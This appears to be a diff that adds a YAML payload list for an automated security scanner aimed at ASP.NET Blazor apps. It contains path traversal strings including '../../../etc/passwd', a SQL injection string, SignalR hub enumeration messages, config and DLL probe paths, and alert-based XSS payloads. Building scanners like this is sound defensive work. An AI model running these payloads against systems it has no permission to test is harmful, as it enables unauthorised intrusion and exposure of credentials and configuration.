@@ -1,0 +1,81 @@
+# Blazor security payloads — covers ASP.NET Blazor WebAssembly and Blazor Server
+# attack vectors specific to the framework.
+#
+# Groups:
+#   route_injection     — route constraint bypass and path traversal in Blazor routes
+#   signalr_invoke      — SignalR hub method names to enumerate (JSON text protocol)
+#                         Each payload is raw JSON; the agent appends \x1e delimiter.
+#   config_paths        — relative paths to probe for exposed configuration files
+#   dll_paths           — common Blazor WASM assembly paths to probe for DLL exposure
+#   component_xss       — XSS payloads targeting Blazor component render tree
+#                         (Razor renders via MarkupString — bypasses default encoding)
+
+payloads:
+  # Route constraint bypass — inject into Blazor route segments
+  # Blazor routing uses ASP.NET Core route templates; constraints like {id:int}
+  # are only validated client-side in WASM. Server-side validation may be absent.
+  route_injection:
+    - "../admin"
+    - "..%2Fadmin"
+    - "%2E%2E%2Fadmin"
+    - "../../admin"
+    - "%2E%2E%2F%2E%2E%2Fadmin"
+    - "..%5cadmin"
+    - "%00"
+    - "../../../etc/passwd"
+    - "..%2F..%2Fetc%2Fpasswd"
+    - "0 UNION SELECT 1,2,3--"
+    - "-1"
+    - "99999999999999999"
+    - "00000000-0000-0000-0000-000000000000"
+
+  # SignalR hub method names to enumerate (common Blazor Server hub targets)
+  # These are JSON text protocol messages — agent appends \x1e record separator.
+  # Hub: /_blazor (default Blazor Server hub endpoint)
+  signalr_invoke:
+    - '{"type":1,"target":"GetAll","arguments":[],"invocationId":"0"}'
+    - '{"type":1,"target":"GetUsers","arguments":[],"invocationId":"0"}'
+    - '{"type":1,"target":"GetData","arguments":[],"invocationId":"0"}'
+    - '{"type":1,"target":"GetItems","arguments":[],"invocationId":"0"}'
+    - '{"type":1,"target":"GetMessages","arguments":[],"invocationId":"0"}'
+    - '{"type":1,"target":"GetOrders","arguments":[],"invocationId":"0"}'
+    - '{"type":1,"target":"GetAdminData","arguments":[],"invocationId":"0"}'
+    - '{"type":1,"target":"GetConfig","arguments":[],"invocationId":"0"}'
+    - '{"type":1,"target":"GetSettings","arguments":[],"invocationId":"0"}'
+    - '{"type":1,"target":"Subscribe","arguments":["admin"],"invocationId":"0"}'
+    - '{"type":1,"target":"BroadcastMessage","arguments":["<script>alert(1)</script>"],"invocationId":"0"}'
+    - '{"type":1,"target":"SendMessage","arguments":["1","<img src=x onerror=alert(1)>"],"invocationId":"0"}'
+    - '{"type":1,"target":"InvokeMethod","arguments":["GetAll"],"invocationId":"0"}'
+
+  # Configuration and sensitive file paths (relative to app root)
+  # Blazor WASM apps sometimes ship appsettings.json to the browser.
+  config_paths:
+    - "/_framework/appsettings.json"
+    - "/_framework/appsettings.Production.json"
+    - "/_framework/appsettings.Development.json"
+    - "/appsettings.json"
+    - "/appsettings.Production.json"
+    - "/_configuration/appsettings"
+    - "/_blazor/negotiate"
+    - "/_blazor/negotiate?negotiateVersion=1"
+    - "/_framework/blazor.boot.json"
+    - "/_framework/blazor.modules.json"
+
+  # Blazor WASM DLL and WASM bundle paths — probe for exposure
+  # When status 200 + MZ header (0x4D5A), the assembly is downloadable and decompilable.
+  dll_paths:
+    - "/_framework/dotnet.native.wasm"
+    - "/_framework/dotnet.wasm"
+    - "/_framework/dotnet.js"
+    - "/_framework/dotnet.native.js"
+    - "/_framework/blazor.webassembly.js"
+
+  # MarkupString / RenderFragment XSS — bypasses Blazor's default HTML encoding
+  # Only fires when developer uses @((MarkupString)userInput) or similar.
+  component_xss:
+    - "<script>alert('DAST_XSS_CONFIRM')</script>"
+    - "<img src=x onerror=\"alert('DAST_XSS_CONFIRM')\">"
+    - "<svg onload=\"alert('DAST_XSS_CONFIRM')\">"
+    - "<details open ontoggle=\"alert('DAST_XSS_CONFIRM')\">"
+    - "javascript:alert('DAST_XSS_CONFIRM')"
+    - "<math><mtext><table><mglyph><style><img src onerror=alert('DAST_XSS_CONFIRM')>"
